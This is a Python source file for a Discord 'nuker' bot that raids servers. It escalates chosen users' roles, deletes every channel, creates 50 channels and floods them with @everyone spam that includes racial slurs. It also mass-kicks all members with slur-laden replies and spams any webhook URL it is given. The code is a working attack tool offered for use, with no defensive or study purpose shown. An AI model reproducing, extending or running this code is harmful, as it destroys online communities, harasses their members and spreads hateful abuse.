import time
import os
import sys
import subprocess
import discord
from discord.ext import commands
import asyncio
import logging
import requests
import colorama
from colorama import Fore, Style, init


def install_requirements_if_needed():
    """Check if requirements are installed, and install them if they're not."""
    try:
        # Run pip check on the requirements file to identify missing or outdated packages
        result = subprocess.run([
            sys.executable, "-m", "pip", "install", "-r", "requirements.txt",
            "--upgrade", "--quiet"
        ],
                                stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE)

        # Output only if packages were installed or upgraded
        if result.returncode == 0:
            print("All dependencies are up to date.")
        else:
            print(
                "Some dependencies were missing or outdated and have been installed."
            )

    except FileNotFoundError:
        print("requirements.txt not found.")
    except subprocess.CalledProcessError as e:
        print(f"Error during installation: {e}")


# Run the function at the start of the script
if os.path.isfile("requirements.txt"):
    install_requirements_if_needed()
    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

# Initialize colorama
init(autoreset=True)

logging.getLogger('discord').setLevel(logging.CRITICAL)
logging.getLogger('discord.http').setLevel(logging.CRITICAL)
logging.getLogger().setLevel(logging.CRITICAL)

# Set up intents
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # Enable member intents
intents.messages = True
intents.message_content = True  # Enable message content intent

# Create the bot instance
bot = commands.Bot(command_prefix='!', intents=intents)


async def async_input(prompt: str) -> str:
    """Async wrapper for input() to avoid blocking the bot."""
    loop = asyncio.get_event_loop()
    return await loop.run_in_executor(None, input, prompt)


@bot.event
async def on_ready():
    # Display the bot's username and ID
    print(f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')

    time.sleep(2)
    os.system('cls' if os.name == 'nt' else 'clear')

    # ASCII art for "DSC NUKER"
    while True:
        print(Fore.RED +
              " $$$$$$\\  $$$$$$$\\   $$$$$$\\        $$\\    $$\\   $$\\   ")
        print(Fore.RED +
              "$$  __$$\\ $$  __$$\\ $$  __$$\\       $$ |   $$ |$$$$ |  ")
        print(Fore.RED +
              "$$ /  $$ |$$ |  $$ |$$ /  \\__|      $$ |   $$ |\\_$$ |  ")
        print(Fore.RED +
              "$$$$$$$$ |$$$$$$$  |$$ |            \\$$\\  $$  |  $$ |  ")
        print(Fore.RED +
              "$$  __$$ |$$  __$$< $$ |             \\$$\\$$  /   $$ |  ")
        print(Fore.RED +
              "$$ |  $$ |$$ |  $$ |$$ |  $$\\         \\$$$  /    $$ |  ")
        print(Fore.RED +
              "$$ |  $$ |$$ |  $$ |\\$$$$$$  |         \\$  /   $$$$$$\\ ")
        print(
            Fore.RED +
            "\\__|  \\__|\\__|  \\__| \\______/           \\_/    \\______| ")
        print(Fore.RED +
              "                                                        ")
        print(Fore.RED +
              "                                                        ")
        print(Fore.RED +
              "                                                        ")
        print(
            Fore.RED +
            " 1. ServerID nuke         2. Message Nuke        3. Webhook Spammer"
        )
        print(" ")
        print(
            Fore.RED +
            " 4. Commands              5. Servers             6. Change Bot Token"
        )
        print(" ")
        print(Fore.RED + " 7. Generate server invite ")
        print(" ")

        choice = await async_input(Fore.RED + "user@ArcV1/~  ")

        os.system('cls' if os.name == 'nt' else 'clear')

        if choice == '1':
                    server_id = await async_input(
                        Fore.RED +
                        "Please enter the Discord server ID you want to manage: ")
                    guild = bot.get_guild(int(server_id))
                    if guild is None:
                        print(
                            Fore.RED +
                            "I cannot find a server with that ID (or the bot is not in it)"
                        )
                    else:
                        # Define a list of user IDs to assign the role to
                        user_ids = [YOUR DISCORD ID (YOU DONT HAVE TO BE IN IT, BUT IF YOU WANT TO TROLL WITH HIGHER ROLES) , OTHER DISCORD ID]  # Replace these with actual user IDs

                        # Get the bot's highest role
                        bot_member = guild.get_member(bot.user.id)
                        if bot_member is None:
                            print(Fore.RED + "Could not find the bot in the server.")
                            return

                        bot_highest_role = bot_member.top_role

                        # Find the highest role that the bot can assign
                        assignable_roles = [role for role in guild.roles if role < bot_highest_role]
                        if not assignable_roles:
                            print(Fore.RED + "There are no roles that the bot can assign.")
                            return

                        highest_assignable_role = max(assignable_roles, key=lambda role: role.position)

                        for user_id in user_ids:
                            user = guild.get_member(user_id)

                            if user is None:
                                print(Fore.RED + f"User  with ID {user_id} not found in the server.")
                            else:
                                # Attempt to add the highest assignable role to the user
                                try:
                                    await user.add_roles(highest_assignable_role)
                                    print(Fore.GREEN + f"Successfully added the highest assignable role '{highest_assignable_role.name}' to the user with ID {user_id}.")
                                except discord.Forbidden:
                                    print(Fore.RED + f"I do not have permission to add roles to user with ID {user_id}.")
                                except discord.HTTPException as e:
                                    print(Fore.RED + f"Failed to add role to user with ID {user_id}: {e}")

                        # Perform nuke actions after assigning roles
                        await perform_nuke(guild)

        elif choice == '2': 
            os.system('cls' if os.name == 'nt' else 'clear')
            print("run !nuke in any channel ")

        elif choice == '3':
            # Webhook Spammer function
            webhook_url = await async_input(Fore.RED +
                                            "Enter the Webhook URL: ")
            for _ in range(10):  # Send 10 messages via webhook
                requests.post(webhook_url, json={"content": "Webhook spam!"})
            print(Fore.RED + "Successfully spammed the webhook.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '4':
            # Commands function
            print(Fore.RED + "Available commands:")
            print(Fore.RED + "!nuke - Nukes the server")
            print(Fore.RED + "!kick - kicks every member")
            time.sleep(3.5901086)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '5':
            os.system('cls' if os.name == 'nt' else 'clear')
            print(Fore.RED + "Bot is in the following servers:")
            for guild in bot.guilds:
                print(Fore.RED +
                      f"Server Name: {guild.name}, Server ID: {guild.id}")
            time.sleep(5)
            os.system('cls' if os.name == 'nt' else 'clear')
        elif choice == '6':
            os.system('cls' if os.name == 'nt' else 'clear')
            new_token = await async_input(Fore.RED +
                                          "Please enter the new bot token: ")
            with open("token.txt", "w") as f:
                f.write(new_token)
            print(Fore.RED + "Bot token has been updated.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')
            
        elif choice == '7':
            if bot.guilds:
                for guild in bot.guilds:  # Loop through all guilds
                    if guild.text_channels:
                        invite = await guild.text_channels[0].create_invite(max_age=500)  # Invite valid for 5 minutes
                        print(Fore.RED + f'Invite link for {guild.name}: {invite}')
                    else:
                        print(Fore.RED + f'No text channels found in {guild.name}.')
                    time.sleep(1)  # Optional: wait a moment between invites for readability
            else:
                print(Fore.RED + "The bot is not in any guilds.")
            time.sleep(5)  # Wait for 5 seconds before clearing the screen
            os.system('cls' if os.name == 'nt' else 'clear')
                
        else:
            print(Fore.RED + "Invalid choice.")
            time.sleep(2)
            os.system('cls' if os.name == 'nt' else 'clear')


@bot.event
async def on_command_error(ctx, error):
    pass


async def perform_nuke(guild):
    # Delete all channels
    for channel in guild.channels:
        await channel.delete()
        await asyncio.sleep(0)  # Delay to avoid rate limits

    new_channels = []
    for i in range(50):
        channel = await guild.create_text_channel(f'NUKED-LOL')
        new_channels.append(channel)

    async def spam_messages(channel):
        for _ in range(10000):
            await channel.send(f'@everyone I RUN YOU BITCH')
            await channel.send(f' @everyone LOL NIGGER')
            await channel.send(
                f'@everyone raided by daddy vyx909 (https://github.com/vyx909/DscNuker)'
            )
            await asyncio.sleep(0)

    for channel in new_channels:
        bot.loop.create_task(spam_messages(channel))

    await asyncio.sleep(1200)  # Adjust the duration as needed

    print("Nuke operation completed!")


@bot.command()
async def nuke(ctx):
    guild = ctx.guild
    await perform_nuke(guild)
    await ctx.send("Nuke operation completed!")

@bot.command()
async def kick(ctx):
    guild = ctx.guild

    # Create a list of kick tasks
    kick_tasks = []

    # Kick all members except the bot and the command issuer
    for member in guild.members:
        if member != ctx.author and member != bot.user:
            kick_tasks.append(member.kick(reason="GET KICKED"))

    # Execute all kick tasks with a limit to avoid hitting rate limits
    for i in range(0, len(kick_tasks), 8):  # Adjust the batch size as needed
        batch = kick_tasks[i:i + 8]
        results = await asyncio.gather(*batch, return_exceptions=True)

        # Handle results
        for member, result in zip(batch, results):
            if isinstance(result, discord.Forbidden):
                await ctx.send(f'DUMB NIGGA I CANT KICK {member.name}!')
            elif isinstance(result, discord.HTTPException):
                await ctx.send(f'GET KICKED DUMB N1GGA')
            else:
                await ctx.send(f'STUPID NIGG3R')

        await asyncio.sleep(0)

token_file = "token.txt"  # Name of the token file
if not os.path.exists(token_file):
    print(Fore.RED + "Made with love by vxcn 💖 (and chatgpt) ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    print(" ")
    token = input(Fore.RED + "Please enter your bot token: ")
    with open(token_file, "w") as f:
        f.write(token)
else:
    with open(token_file, "r") as f:
        token = f.read().strip()
os.system('cls' if os.name == 'nt' else 'clear')
bot.run(token, log_level=logging.CRITICAL)
